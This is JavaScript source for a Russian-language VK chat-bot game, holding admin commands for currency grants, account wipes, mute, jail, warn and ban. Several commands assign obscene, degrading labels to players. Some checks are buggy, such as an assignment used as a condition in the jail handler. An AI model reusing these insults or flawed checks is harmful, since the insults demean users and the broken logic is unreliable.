vk.updates.hear(/^(?:givedonate)\s?([0-9]+)?\s?([0-9]+)?/i,  message => {
	let id = user_id(message.user)
	
	let i = config;
	let user = acc.users[user_id(message.user)];
	if(user.ap < 3) return message.send(`🔸 ➾ Вы не спец.администратор`);
	if(!message.$match[1] || !acc.users[message.$match[1]] || !message.$match[2] || message.$match[2] < 0) return message.send(`💰 ➾ Пример: 'givedonate [ID] [COUNT]'`); 
	acc.users[message.$match[1]].donate += Number(message.$match[2]);

	var is = [user_id(message.user), message.text] 
	adm_log(is)
	return message.send(`💎 ➾ Вы выдали игроку [@id${acc.users[message.$match[1]].id}(${acc.users[message.$match[1]].prefix})] ${spaces(message.$match[2])} рубинов💎`);
});

vk.updates.hear(/^(?:removedonate)\s?([0-9]+)?\s?([0-9]+)?/i, message => {
	let id = user_id(message.user)

	let i = config;
	if(acc.users[id].ap < 3) return;
	if(!message.$match[1] || !acc.users[message.$match[1]] || !message.$match[2] || message.$match[2] < 0) return message.send(`💎 ➾ Пример: 'removedonate [ID] [COUNT] \n💎 ➾ COUNT - количество отнимаемого доната.'`); 
	let user = acc.users[user_id(message.user)];
	if(user.ap < 3) return message.send(`🔸 ➾ Вы не администратор`); 
	acc.users[message.$match[1]].donate -= Number(message.$match[2]);
	return message.send(`💎 ➾ Вы забрали  у [@id${acc.users[message.$match[1]].id}(${acc.users[message.$match[1]].prefix})] ${message.$match[2]} рубинов`);

});





vk.updates.hear(/^(?:!спец)$/i, message => {
	let id = user_id(message.user)
	if(acc.users[id].ap < 3) return;
	return message.send(`
		Команды спец.администратора
		removerub [id] - аннулировать валюту.
		givedonate [id] [count] - выдать донат.
		removedonate [id] [count] - отнять кол-во доната.
		givebro [id] - Выдать лидерку HiBroNiga
		givecalen [id] - Выдать лидерку Calentura
		aresta - оффнуть капт
		dresta - вкл капт
		**********************
		○ givekaz id - выдать казик
		○ dellkaz id - забрать казик
		○ givebank id - выдать банк
		○ dellbank id - забрать банк
		○ giveferma id - выдать элитную ферму ( ТОЛЬКО НА РАЗДАЧЕ )
		○ dellferma id - забрать элитную ферму 
		○ giveceys id [кол-во] - выдать кейсик ( зол. )
		○ givesuk id [кол-во] - выдать кейсик ( брил. )
		○ potpi [сумма] - пополнить баланс банка джекпота



		🌍 ►  Сонли - сбросить онлайн
		❄ ►   Мороз - включить систему мороза
		dbalance - посмотреть баланс банка джекпот

		👝 bag - посмотреть список людей с багом баланса


		**********************

		kazna - снять 10.000 с казны штата

		boostzp ID LVL(1-24)
		boostbiz ID LVL(1-24)

		givevip id time
		givemoder id time
		giveadm id time 
		lvlapp id [ap]
		lvldell id [ap]


		* * * РАЗДАЧА * * *
		раздачаметеорит id [сумма]
		раздачабаланс id [сумма]
		( Данные команды используйте для раздачи ).

		*****************************************
		pit [ID] [название] - Выдать питомца ( ваше название )

		`);

});
////
vk.updates.hear(/^(?:pit)\s?([0-9]+)?\s([^]+)?/i, (message) => {		
	let user = acc.users[user_id(message.user)];
	if(!message.$match[1] || !acc.users[message.$match[1]] || !message.$match[2]) return message.send(`🔸 ➾ Пример команды: pit [ID] [название]`);
	if(!Number(message.$match[1])) return message.send(`🔸 ➾ Число должно быть цифрового вида.`);
	if(user.ap < 3) return message.send(`🔸 ➾ Вы не администратор`);
	let a = zapret(message.$match[1]);
	if(a != 0) return message.send(a)
		if(!acc.users[message.$match[1]]) return message.send(`❎ ➾ Такого игрока нет!`);
	acc.users[message.$match[1]].pit = message.$match[2]; 
	vk.api.call('messages.send', {
		peer_id: acc.users[message.$match[1]].id,
		message: `✅ ➾ ${user.prefix} выдал вам питомца ${message.$match[2]}`,random_id: 0
	});
	var is = [user_id(message.user), message.text] 
	adm_log(is)
	return message.send(` ➾ Вы выдали питомца игроку [${acc.users[message.$match[1]].prefix}]\n ➾ Питомец: ${message.$match[2]}`);
}); 
vk.updates.hear(/^(?:givedom)\s?([0-9]+)?\s([^]+)?/i, (message) => {		
	let user = acc.users[user_id(message.user)];
	if(!message.$match[1] || !acc.users[message.$match[1]] || !message.$match[2]) return message.send(` ➾ Пример команды: givedom [ID] [название]`);
	if(!Number(message.$match[1])) return message.send(`🔸 ➾ Число должно быть цифрового вида.`);
	if(user.ap < 3) return message.send(`🔸 ➾ Вы не администратор`);
	let a = zapret(message.$match[1]);
	if(a != 0) return message.send(a)
		if(!acc.users[message.$match[1]]) return message.send(`❎ ➾ Такого игрока нет!`);
	acc.users[message.$match[1]].house = message.$match[2]; 
	vk.api.call('messages.send', {
		peer_id: acc.users[message.$match[1]].id,
		message: ` ➾ ${user.prefix} выдал вам элитный дом ${message.$match[2]}`,random_id: 0
	});
	var is = [user_id(message.user), message.text] 
	adm_log(is)
	return message.send(` ➾ Вы выдали дом игроку [${acc.users[message.$match[1]].prefix}] \n ➾ Дом: ${message.$match[2]}`);
}); 
////


vk.updates.hear(/^(?:delluser)\s?([0-9]+)?/i,  message => {
	let id = user_id(message.user)

	let i = config;
	if(acc.users[id].ap < 3) return;

	let user = acc.users[user_id(message.user)];
	if(user.ap < 3) return message.send(`🔸 ➾ Вы не администратор`);
	if(!message.$match[1] || !acc.users[message.$match[1]]) return message.send(`💰 ➾ Пример: 'delluser [ID]'`); 

	acc.users[message.$match[1]].balance = 0;
	acc.users[message.$match[1]].bitcoin = 0
	acc.users[message.$match[1]].donate = 0
	acc.users[message.$match[1]].exs = 0
	acc.users[message.$match[1]].exsup = 50
	acc.users[message.$match[1]].lvl  = 0
	acc.users[message.$match[1]].game.binlose =0
	acc.users[message.$match[1]].game.binwin =0
	acc.users[message.$match[1]].game.binstop = false
	acc.users[message.$match[1]].game.kazlose =0
	acc.users[message.$match[1]].game.kazwin =0
	acc.users[message.$match[1]].game.rand_lose =0
	acc.users[message.$match[1]].game.rand_win =0
	acc.users[message.$match[1]].game.stavka_win =0
	acc.users[message.$match[1]].game.stavka_lose =0
	acc.users[message.$match[1]].game.win = 50
	acc.users[message.$match[1]].msg.messages = 0
	acc.users[message.$match[1]].msg.last_msg = ''
	acc.users[message.$match[1]].prefix = `Удален | ${time()} | ${data()}`
	acc.users[message.$match[1]].cars = false
	acc.users[message.$match[1]].house = false
	acc.users[message.$match[1]].lodka = false
	acc.users[message.$match[1]].rep.status = false
	acc.users[message.$match[1]].rep.id = false 
	acc.users[message.$match[1]].warn = 0 
	acc.users[message.$match[1]].warn_p = []
	acc.users[message.$match[1]].aircraft = false
	acc.users[message.$match[1]].helicopter = false 
	acc.users[message.$match[1]].ap = 0
	acc.users[message.$match[1]].bizs.one_biz = false
	acc.users[message.$match[1]].bizs.two_biz =  false
	acc.users[message.$match[1]].bizs.one.count = false
	acc.users[message.$match[1]].bizs.one.balance = 0
	acc.users[message.$match[1]].bizs.one.id = false
	acc.users[message.$match[1]].bizs.one.name = false
	acc.users[message.$match[1]].bizs.one.people = 0
	acc.users[message.$match[1]].bizs.one.uplvl = 0
	acc.users[message.$match[1]].bizs.one.zp = 0 
	acc.users[message.$match[1]].bizs.two.count = false
	acc.users[message.$match[1]].bizs.two.balance = 0
	acc.users[message.$match[1]].bizs.two.id = false
	acc.users[message.$match[1]].bizs.two.name = false
	acc.users[message.$match[1]].bizs.two.people = 0
	acc.users[message.$match[1]].bizs.two.uplvl = 0
	acc.users[message.$match[1]].bizs.two.zp = 0 
	acc.users[message.$match[1]].bizs.two.max_peop = 0 
	acc.users[message.$match[1]].bizs.one.max_peop = 0 
	acc.users[message.$match[1]].job.name = false;
	acc.users[message.$match[1]].job.count = 0;
	acc.users[message.$match[1]].job.stop = false;
	acc.users[message.$match[1]].job.lvl = 0;
	acc.users[message.$match[1]].mute = false;
	acc.users[message.$match[1]].ferm.id = false;
	acc.users[message.$match[1]].ferm.zp = 0;
	acc.users[message.$match[1]].reys = false;
	acc.users[message.$match[1]].housep = 0;
	acc.users[message.$match[1]].pit = false;
	acc.users[message.$match[1]].bank = 0;
	acc.users[acc.users[message.$match[1]].brak].brak = false;
	acc.users[message.$match[1]].brak = false;
	acc.users[message.$match[1]].safe.status = false;
	acc.users[message.$match[1]].safe.key = false;
	acc.users[message.$match[1]].credit = 0;
	acc.users[message.$match[1]].procent = 0;
	acc.users[message.$match[1]].global_exs = 0;
	acc.users[message.$match[1]].autozp = false;
	acc.users[message.$match[1]].autobiz = false;
	acc.users[message.$match[1]].duel = false;
	acc.users[message.$match[1]].duel_summ = false;
	acc.users[message.$match[1]].uron = 0;
	acc.users[message.$match[1]].gun_name = false;
	acc.users[message.$match[1]].block_game = true;
	acc.users[message.$match[1]].nachal = false;

	return message.send(`💰 ➾ Вы удалил аккаунт игрока [@id${acc.users[message.$match[1]].id}(${acc.users[message.$match[1]].prefix})]`);
	
});
vk.updates.hear(/^(?:dellci)\s?([0-9]+)?/i,  message => {
	let id = user_id(message.user)

	let i = config;
	if(acc.users[id].ap < 3) return;

	let user = acc.users[user_id(message.user)];
	if(user.ap < 3) return message.send(`🔸 ➾ Вы не администратор`);
	if(!message.$match[1] || !acc.users[message.$match[1]]) return message.send(`💰 ➾ Пример: 'dellci [ID]'`); 

	acc.users[message.$match[1]].bank = 0;


	return message.send(`sasnul`);
	
});
/////////////////////////////////////
vk.updates.hear(/^(?:giveler)\s?([0-9]+)?/i,  message => {
	let id = user_id(message.user)

	let i = config;
	if(acc.users[id].ap < 3) return;

	let user = acc.users[user_id(message.user)];
	if(user.ap < 3) return message.send(`🔸 ➾ Вы не администратор`);
	if(!message.$match[1] || !acc.users[message.$match[1]]) return message.send(`💰 ➾ Пример: 'giveler [ID]'`); 

	acc.users[message.$match[1]].pit = `админ`;
	acc.users[message.$match[1]].balance = 0;

	return message.send(`Успешно !`);
	
});
///////////////////////////////////
vk.updates.hear(/^(?:givepopa)\s?([0-9]+)?/i,  message => {
	let id = user_id(message.user)

	let i = config;
	if(acc.users[id].ap < 3) return;

	let user = acc.users[user_id(message.user)];
	if(user.ap < 3) return message.send(`🔸 ➾ Вы не администратор`);
	if(!message.$match[1] || !acc.users[message.$match[1]]) return message.send(`💰 ➾ Пример: 'givepopa [ID]'`); 

	acc.users[message.$match[1]].pit = `грязный бомж`;

	return message.send(`Успешно !`);
	
});
///////////////////////////////////
vk.updates.hear(/^(?:givepizda)\s?([0-9]+)?/i,  message => {
	let id = user_id(message.user)

	let i = config;
	if(acc.users[id].ap < 3) return;

	let user = acc.users[user_id(message.user)];
	if(user.ap < 3) return message.send(`🔸 ➾ Вы не администратор`);
	if(!message.$match[1] || !acc.users[message.$match[1]]) return message.send(`💰 ➾ Пример: 'givepizda [ID]'`); 

	acc.users[message.$match[1]].pit = `Вонючая пизда`;

	return message.send(`Успешно !`);
	
});
/////////////////////////////////// 
vk.updates.hear(/^(?:cardell)\s?([0-9]+)?/i,  message => {
	let id = user_id(message.user)

	let i = config;
	if(acc.users[id].mysor < 1) return;

	let user = acc.users[user_id(message.user)];
	if(user.ap < 3) return message.send(`🔸 ➾ Вы не мент !`);
	if(!message.$match[1] || !acc.users[message.$match[1]]) return message.send(`💰 ➾ Пример: 'cardell [ID]'`); 

	acc.users[message.$match[1]].cars = false


	return message.send(`Вы забрали машину у игрока [@id${acc.users[message.$match[1]].id}(${acc.users[message.$match[1]].prefix})]`);
	
});
///////////////////////////////
vk.updates.hear(/^(?:gundell)\s?([0-9]+)?/i,  message => {
	let id = user_id(message.user)

	let i = config;
	if(acc.users[id].mysor < 1) return;

	let user = acc.users[user_id(message.user)];
	if(user.ap < 3) return message.send(`🔸 ➾ Вы не мент !`);
	if(!message.$match[1] || !acc.users[message.$match[1]]) return message.send(`💰 ➾ Пример: 'gundell [ID]'`); 

	acc.users[message.$match[1]].gun_name = false;


	return message.send(`Вы забрали оружие у игрока [@id${acc.users[message.$match[1]].id}(${acc.users[message.$match[1]].prefix})]`);
	
});
///////////////////////////////
vk.updates.hear(/^(?:jail)?\s([0-9]+)?\s?([0-9]+)?/i, (message) => { 
	let user = acc.users[user_id(message.user)];;
	if(user.mysor < 1) return message.send(`🔸 ➾ Вы не мент`);
	let a = zapret(message.$match[1]);
	if(a != 0) return message.send(a)
		if(acc.users[message.$match[1]].ap > 3) return message.send(`Ошибка !`);
	if(acc.users[message.$match[1]].volff10 > 1) return message.send(`Игрок не в розыске !`);
	if(acc.users[message.$match[1]].fggg = 10) return message.send(`Игрок спрятался !`);
	if(!message.$match[2] || !Number(message.$match[1]) || !Number(message.$match[2]) || !acc.users[message.$match[1]] || message.$match[2] > 10 || message.$match[2] < 1) return message.send(`⏺ ➾ Проверьте вводимые данные:\n⏺ ➾ jail [ID] [TIME(1-10)]`);
	if(user.bloks.ment == true) return message.send(`Сажать можно раз в 10 минут`);
	user.bloks.ment = true
	setTimeout(() => {
		user.bloks.ment = false
	}, 600000);
	let time = message.$match[2] * 60000;
	let id = Number(message.$match[1])
	acc.users[id].mute = true;
	acc.users[id].volff10 = 0;

	var is = [user_id(message.user), message.text] 
	adm_log(is)

	setTimeout(() => {
		acc.users[id].mute = false;
		vk.api.call('messages.send', {
			peer_id: acc.users[id].id,
			message: `Вы вышли с тюрьмы`,random_id: 0
		});
	}, time);

	vk.api.call('messages.send', {
		peer_id: acc.users[id].id,
		message: `Мент ${user.prefix} посадил вас за решетку [${message.$match[2]}] минут(ы).\n\n⏺ ➾ Через [${message.$match[2]}] минут вы выйдете с тюрьмы!\nЕсли Вы не согласны с блокировкой, можете подать жалобу со скринами тут https://vk.com/topic-181438458_39576234`,random_id: 0
	});
	return message.send(`Вы посадали говнюка [@id${acc.users[message.$match[1]].id}(${acc.users[message.$match[1]].prefix})] на ${time/10} минут`); 
});
//////////////// mute /////////
vk.updates.hear(/^(?:mute)?\s([0-9]+)?\s?([0-9]+)?/i, (message) => { 
	if (message.$match[1] == 1) {
		message.send(`⛔ Ошибка. Это @vkbotevolk(разработчик) @mskbt(проекта).\n -- Вы никак не можете воздействовать на данный профиль.`);
		return message.sendSticker(13475);
	} 
	let user = acc.users[user_id(message.user)];;
	if(user.ap < 3) return message.send(`🔸 ➾ Вы не модератор`);
	if(user.bloks.rukus == true) return message.send(`⚠ Не флудите !`);
	user.bloks.rukus = true
	setTimeout(() => {
		user.bloks.rukus = false
	}, 55000);
	let a = zapret(message.$match[1]);
	if(a != 0) return message.send(a)
		if(acc.users[message.$match[1]].ap > 3) return message.send(`Ошибка !`);		
	if(!message.$match[2] || !Number(message.$match[1]) || !Number(message.$match[2]) || !acc.users[message.$match[1]] || message.$match[2] > 999 || message.$match[2] < 1) return message.send(`⏺ ➾ Проверьте вводимые данные:\n⏺ ➾ mute [ID] [TIME(1-999)]`);
	let time = message.$match[2] * 60000;
	let id = Number(message.$match[1])
	acc.users[id].mute = true;

	var is = [user_id(message.user), message.text] 
	adm_log(is)

	setTimeout(() => {
		acc.users[id].mute = false;
		vk.api.call('messages.send', {
			peer_id: acc.users[id].id,
			message: `⏺ ➾ Временная блокировка была снята. :)`,random_id: 0
		});
	}, time);

	vk.api.call('messages.send', {
		peer_id: acc.users[id].id,
		attachment: "photo-178754644_456239020",
		message: `⏺ ➾ ${user.prefix} временно заблокировал доступ к боту на [${message.$match[2]}] минут(ы).\n\n⏺ ➾ Через [${message.$match[2]}] минут блокировка пропадет.\nЕсли Вы не согласны с блокировкой, можете подать жалобу со скринами тут https://vk.com/topic-181438458_39576234`,random_id: 0
	});
	return message.send(`💰 ➾ Вы заблокировали временно доступ к боту игроку  [@id${acc.users[message.$match[1]].id}(${acc.users[message.$match[1]].prefix})] на ${time/60000} минут`, { attachment: "photo-178754644_456239017" });	 });


vk.updates.hear(/^(?:unmute)\s?([0-9]+)?/i, (message) => { 
	let user = acc.users[user_id(message.user)];
	if(user.ap < 3) return message.send(`🔸 ➾ Вы не VIP`);
	if(!message.$match[1] || !Number(message.$match[1]) || !acc.users[message.$match[1]]) return message.send(`⏺ ➾ Проверьте вводимые данные:\n⏺ ➾ unmute [ID]`);
	var is = [user_id(message.user), message.text] 
	adm_log(is)

	acc.users[message.$match[1]].mute = false;  
	vk.api.call('messages.send', {
		peer_id: acc.users[message.$match[1]].id,
		message: `⏺ ➾ Временная блокировка была снята досрочно | Больше не нарушайте :)`,random_id: 0
	});
	return message.send(`💰 ➾ Вы сняли блокировку игроку [@id${acc.users[message.$match[1]].id}(${acc.users[message.$match[1]].prefix})]`);

});


vk.updates.hear(/^(?:oon)\s?([0-9]+)?/i, (message) => { 
	let user = acc.users[user_id(message.user)];
	if(!message.$match[1]) return message.send(`🔸 ➾ Пример команды: oon ID`);
	if(!Number(message.$match[1])) return message.send(`🔸 ➾ Число должно быть цифрового вида.`);
	if(user.ap < 3) return message.send(`🔸 ➾ Вы не администратор`);
	if(!acc.users[message.$match[1]]) return message.send(`❎ ➾ Такого игрока нет!`);
	acc.users[message.$match[1]].block_game = true 

	var is = [user_id(message.user), message.text] 
	adm_log(is)
	return message.send(`✅ ➾ Вы поставили ограничение на ставки игроку [${acc.users[message.$match[1]].prefix}]`);
}); 

vk.updates.hear(/^(?:oof)\s?([0-9]+)?/i, (message) => { 
	let user = acc.users[user_id(message.user)];
	if(!message.$match[1]) return message.send(`🔸 ➾ Пример команды: ooff ID`);
	if(!Number(message.$match[1])) return message.send(`🔸 ➾ Число должно быть цифрового вида.`);
	if(user.ap < 3) return message.send(`🔸 ➾ Вы не администратор`);
	if(!acc.users[message.$match[1]]) return message.send(`❎ ➾ Такого игрока нет!`);
	acc.users[message.$match[1]].block_game = false; 

	var is = [user_id(message.user), message.text] 
	adm_log(is)
	return message.send(`✅ ➾ Вы сняли ограничение на ставки игроку [${acc.users[message.$match[1]].prefix}]`);
}); 

vk.updates.hear(/^(?:unban)\s?([0-9]+)?/i, (message) => { 
	let user = acc.users[user_id(message.user)];
	if(!message.$match[1]) return message.send(`🔸 ➾ Пример команды: unban ID`);
	if(!Number(message.$match[1])) return message.send(`🔸 ➾ Число должно быть цифрового вида.`);
	if(user.ap < 3) return message.send(`🔸 ➾ Вы не администратор`);
	if(!acc.users[message.$match[1]]) return message.send(`❎ ➾ Такого игрока нет!`);
	acc.users[message.$match[1]].ban = false 
	vk.api.call('messages.send', {
		peer_id: acc.users[message.$match[1]].id,
		message: `✅ ➾ ${user.prefix} разблокировал Вас.`,random_id: 0
	});
	var is = [user_id(message.user), message.text] 
	adm_log(is)
	return message.send(`✅ ➾ Вы разблокировали игрока [${acc.users[message.$match[1]].prefix}]`);
});



vk.updates.hear(/^(?:givekaz)\s?([0-9]+)?/i, (message) => { 
	let user = acc.users[user_id(message.user)];
	if(!message.$match[1]) return message.send(` Пример команды: givekaz ID`);
	if(!Number(message.$match[1])) return message.send(`🔸 ➾ Число должно быть цифрового вида.`);
	if(user.ap < 3) return message.send(`Ты не спец админ!`);
	if(!acc.users[message.$match[1]]) return message.send(`❎ ➾ Такого игрока нет!`);
	acc.users[message.$match[1]].mer = 3; 
	vk.api.call('messages.send', {
		peer_id: acc.users[message.$match[1]].id,
		message: ``,random_id: 0
	});
	var is = [user_id(message.user), message.text] 
	adm_log(is)
	return message.send(`Успешно !`);
});




vk.updates.hear(/^(?:givebank)\s?([0-9]+)?/i, (message) => { 
	let user = acc.users[user_id(message.user)];
	if(!message.$match[1]) return message.send(` Пример команды: givebank ID`);
	if(!Number(message.$match[1])) return message.send(`🔸 ➾ Число должно быть цифрового вида.`);
	if(user.ap < 3) return message.send(`Ты не спец админ!`);
	if(!acc.users[message.$match[1]]) return message.send(`❎ ➾ Такого игрока нет!`);
	acc.users[message.$match[1]].lox = 3; 
	vk.api.call('messages.send', {
		peer_id: acc.users[message.$match[1]].id,
		message: ``,random_id: 0
	});
	var is = [user_id(message.user), message.text] 
	adm_log(is)
	return message.send(`Успешно !`);
});
vk.updates.hear(/^(?:dellbank)\s?([0-9]+)?/i, (message) => { 
	let user = acc.users[user_id(message.user)];
	if(!message.$match[1]) return message.send(` Пример команды: dellbank ID`);
	if(!Number(message.$match[1])) return message.send(`🔸 ➾ Число должно быть цифрового вида.`);
	if(user.ap < 3) return message.send(`Ты не спец админ!`);
	if(!acc.users[message.$match[1]]) return message.send(`❎ ➾ Такого игрока нет!`);
	acc.users[message.$match[1]].lox = 0; 
	vk.api.call('messages.send', {
		peer_id: acc.users[message.$match[1]].id,
		message: ``,random_id: 0
	});
	var is = [user_id(message.user), message.text] 
	adm_log(is)
	return message.send(`Успешно !`);
});
vk.updates.hear(/^(?:dellkaz)\s?([0-9]+)?/i, (message) => { 
	let user = acc.users[user_id(message.user)];
	if(!message.$match[1]) return message.send(` Пример команды: dellkaz ID`);
	if(!Number(message.$match[1])) return message.send(`🔸 ➾ Число должно быть цифрового вида.`);
	if(user.ap < 3) return message.send(`Ты не спец админ!`);
	if(!acc.users[message.$match[1]]) return message.send(`❎ ➾ Такого игрока нет!`);
	acc.users[message.$match[1]].mer = 0; 
	vk.api.call('messages.send', {
		peer_id: acc.users[message.$match[1]].id,
		message: ``,random_id: 0
	});
	var is = [user_id(message.user), message.text] 
	adm_log(is)
	return message.send(`Успешно !`);
});
vk.updates.hear(/^(?:gived)\s?([0-9]+)?/i, (message) => { 
	let user = acc.users[user_id(message.user)];
	if(!message.$match[1]) return message.send(`🔸 ➾ Пример команды: gived ID`);
	if(!Number(message.$match[1])) return message.send(`🔸 ➾ Число должно быть цифрового вида.`);
	if(user.ap < 3) return message.send(`🔸 ➾ Вы не админ !`);
	if(!acc.users[message.$match[1]]) return message.send(`❎ ➾ Такого игрока нет!`);
	acc.users[message.$match[1]].kvest21 = true; 
	vk.api.call('messages.send', {
		peer_id: acc.users[message.$match[1]].id,
		message: `Администратор: ${user.prefix} выдал Вам статус " донатер "`,random_id: 0
	});
	var is = [user_id(message.user), message.text] 
	adm_log(is)
	return message.send(`успешно ! >>>[${acc.users[message.$match[1]].prefix}]`);
});
vk.updates.hear(/^(?:delld)\s?([0-9]+)?/i, (message) => { 
	let user = acc.users[user_id(message.user)];
	if(!message.$match[1]) return message.send(`🔸 ➾ Пример команды: delld ID`);
	if(!Number(message.$match[1])) return message.send(`🔸 ➾ Число должно быть цифрового вида.`);
	if(user.ap < 3) return message.send(`🔸 ➾ Вы не админ !`);
	if(!acc.users[message.$match[1]]) return message.send(`❎ ➾ Такого игрока нет!`);
	acc.users[message.$match[1]].kvest21 = false; 
	vk.api.call('messages.send', {
		peer_id: acc.users[message.$match[1]].id,
		message: `Администратор: ${user.prefix} забрал у вас статус " донатер "`,random_id: 0
	});
	var is = [user_id(message.user), message.text] 
	adm_log(is)
	return message.send(`успешно ! >>>[${acc.users[message.$match[1]].prefix}]`);
});
vk.updates.hear(/^(?:Обнять)\s?([0-9]+)?/i, (message) => { 
	let user = acc.users[user_id(message.user)];
	if(!message.$match[1]) return message.send(`🔸 ➾ Пример команды: обнять ID`);
	if(!Number(message.$match[1])) return message.send(`🔸 ➾ Число должно быть цифрового вида.`);
	if(user.ap < 3) return message.send(`🔸 ➾ Вы не VIP игрок`);
	if(!acc.users[message.$match[1]]) return message.send(`❎ ➾ Такого игрока нет!`);
	acc.users[message.$match[1]].shel = 0; 
	vk.api.call('messages.send', {
		peer_id: acc.users[message.$match[1]].id,
		message: `💑 игрок ${user.prefix} обнял вас!`,random_id: 0
	});
	var is = [user_id(message.user), message.text] 
	adm_log(is)
	return message.send(`💑 Вы обняли [${acc.users[message.$match[1]].prefix}]`);
});	
vk.updates.hear(/^(?:тырфваынуваыть)\s?([0-9]+)?/i, (message) => { 
	let user = acc.users[user_id(message.user)];
	if(user.bloks.pari == true) return message.send(`⚠ Тырить бабло можно раз в 30 минут !`);
	user.bloks.pari = true
	setTimeout(() => {
		user.bloks.pari = false
		vk.api.call('messages.send', {
			peer_id: user.id,
			message: `Вы снова можете тырить !` ,random_id: 0
		});
	}, 1800000);
	if(!message.$match[1]) return message.send(`🔸 ➾ Пример команды: тырнуть ID`);
	if(!Number(message.$match[1])) return message.send(`🔸 ➾ Число должно быть цифрового вида.`);
	if(user.ap < 3) return message.send(`🔸 ➾ Вы не VIP игрок`);
	if(!acc.users[message.$match[1]]) return message.send(`❎ ➾ Такого игрока нет!`);
	if(acc.users[message.$match[1]].balance < 50000) return message.send(`❎ ➾ У игрока нет 50.000 $ !`);
	acc.users[message.$match[1]].balance -= 50000;
	user.balance += 50000;	
	vk.api.call('messages.send', {
		peer_id: acc.users[message.$match[1]].id,
		message: `Внимания ! Кто-то украл у вас 50.000 $ ! Советуем ложить все деньги в банк !`,random_id: 0
	});
	var is = [user_id(message.user), message.text] 
	adm_log(is)
	return message.send(`💴 Вы украли 50000 у игрока [${acc.users[message.$match[1]].prefix}]`);
});	





vk.updates.hear(/^(?:pyes)\s?([0-9]+)?/i, (message) => { 
	let user = acc.users[user_id(message.user)];
	if(!message.$match[1]) return message.send(`🔸 ➾ Пример команды: pyes ID`);
	if(user.ap < 3) return message.send(`⚠ ➾ Вы не Администратор`);
	if(!Number(message.$match[1])) return message.send(`🔸 ➾ Число должно быть цифрового вида.`);
	if(acc.users[message.$match[1]].spid == true) return message.send(`Его аккаунт уже кто-то подтвердил.`);
	if(!acc.users[message.$match[1]]) return message.send(`❎ ➾ Такого игрока нет!`);
	acc.users[message.$match[1]].spid = true; 	
	vk.api.call('messages.send', {
		peer_id: acc.users[message.$match[1]].id,
		message: `✅ [Внимание]: Ваш аккаунт был подтвержден администрацией BigWars !\nПриятной игры !`,random_id: 0
	});
	var is = [user_id(message.user), message.text] 
	adm_log(is)
	return message.send(`Аккаунт >>>> успешно подтвержден | [${acc.users[message.$match[1]].prefix}] |`);
});
vk.updates.hear(/^(?:pno)\s?([0-9]+)?/i, (message) => { 
	let user = acc.users[user_id(message.user)];
	if(!message.$match[1]) return message.send(`🔸 ➾ Пример команды: pno ID`);
	if(user.ap < 3) return message.send(`⚠ ➾ Вы не Администратор`);
	if(!Number(message.$match[1])) return message.send(`🔸 ➾ Число должно быть цифрового вида.`);
	if(!acc.users[message.$match[1]]) return message.send(`❎ ➾ Такого игрока нет!`);
	acc.users[message.$match[1]].spid = false; 	
	vk.api.call('messages.send', {
		peer_id: acc.users[message.$match[1]].id,
		message: `🛑 [Внимание]: Ваш аккаунт не был подтвержден !`,random_id: 0
	});
	var is = [user_id(message.user), message.text] 
	adm_log(is)
	return message.send(`Аккаунт >>>> Отказ | [${acc.users[message.$match[1]].prefix}] |`);
});

	/////////////////////////////////////////////////////////////////////////////////////////////

	vk.updates.hear(/^(?:warn)\s?([0-9]+)?\s([^]+)?/i, (message) => { 
		if (message.$match[1] == 1) {
			message.send(`⛔ Ошибка. Это @vkbotevolk(разработчик) @mskbt(проекта).\n -- Вы никак не можете воздействовать на данный профиль.`);
			return message.sendSticker(13475);
		} 
		let user = acc.users[user_id(message.user)];
		if(!message.$match[1] || !message.$match[2]) return message.send(`🔸 ➾ Пример команды: warn [ID] [ПРИЧИНА]`);
		if(!Number(message.$match[1])) return message.send(`🔸 ➾ Число должно быть цифрового вида.`);
		if(user.ap < 3) return message.send(`🔸 ➾ Вы не MODER`);
		let a = zapret(message.$match[1]);
		if(a != 0) return message.send(a)
			if(!acc.users[message.$match[1]]) return message.send(`❎ ➾ Такого игрока нет!`);

		acc.users[message.$match[1]].warn += 1;
		acc.users[message.$match[1]].warn_p.push(message.$match[2]);
		logs(user_id(message.user), message.$match[1], message.$match[2], type = 6)

		var is = [user_id(message.user), message.text] 
		adm_log(is)

		let text = `✅ ➾ ${user.prefix} выдал вам warn(предупреждение)\nОбжаловать можно тут: https://vk.com/topic-181438458_39576234`
		if(acc.users[message.$match[1]].warn == 3){
			acc.users[message.$match[1]].warn = 0;
			acc.users[message.$match[1]].ban = true;
			acc.users[message.$match[1]].warn_p = []
			text += `\n🔸 ➾ У вас 3 предупреждения.\n🔸 ➾ Ваш аккаунт заблокирован.`
		}
		vk.api.call('messages.send', {
			peer_id: acc.users[message.$match[1]].id,
			message: text,random_id: 0
		});
		user.ainfo.warns += 1;
		return message.send(`✅ ➾ Вы выдали предупреждение игроку [${acc.users[message.$match[1]].prefix}].`);
	}); 



	vk.updates.hear(/^(?:unwarn)\s?([0-9]+)?/i, (message) => { 
		let user = acc.users[user_id(message.user)];
		if(!message.$match[1]) return message.send(`🔸 ➾ Пример команды: unwarn ID`);
		if(!Number(message.$match[1])) return message.send(`🔸 ➾ Число должно быть цифрового вида.`);
		if(user.ap < 3) return message.send(`🔸 ➾ Вы не Гл.Администратор`);
		if(!acc.users[message.$match[1]]) return message.send(`❎ ➾ Такого игрока нет!`);

		acc.users[message.$match[1]].warn = 0; 
		acc.users[message.$match[1]].warn_p = []

		vk.api.call('messages.send', {
			peer_id: acc.users[message.$match[1]].id,
			message: `✅ ➾ Администратор снял Вам все предупреждения`,random_id: 0
		});
		var is = [user_id(message.user), message.text] 
		adm_log(is)
		return message.send(`✅ ➾ Вы сняли все предупреждения игроку [${acc.users[message.$match[1]].prefix}].`);
	});








	vk.updates.hear(/^(?:get)\s?([0-9]+)?/i, (message) => { 
		if (message.$match[1] == 1) {
			message.send(`⛔ Ошибка. Это @vkbotevolk(разработчик) @mskbt(проекта).\n -- Вы никак не можете воздействовать на данный профиль.`);
			return message.sendSticker(13475);
		} 
		let user = acc.users[user_id(message.user)]; 
		let warns = '';
		if(!message.$match[1] || !Number(message.$match[1]) || !acc.users[message.$match[1]]) return message.send(`🔸 ➾ Проверьте вводимые данные.`);
		for(i=0;i<acc.users[message.$match[1]].warn_p.length;i++){warns += `⛔ ➾ ${acc.users[message.$match[1]].warn_p[i]}\n`}
			if(user.ap < 3) return; 
		let id = acc.users[message.$match[1]]
		return message.send(`
			📋 Информация об игроке [${id.prefix}] 📋
			🔸 ➾ Имя: ${id.prefix}
			🔹 ➾ ID: ${message.$match[1]}
			🔹 ➾ Цифровой: ${id.id}
			🔹 ➾ VK: @id${id.id}(${id.prefix})
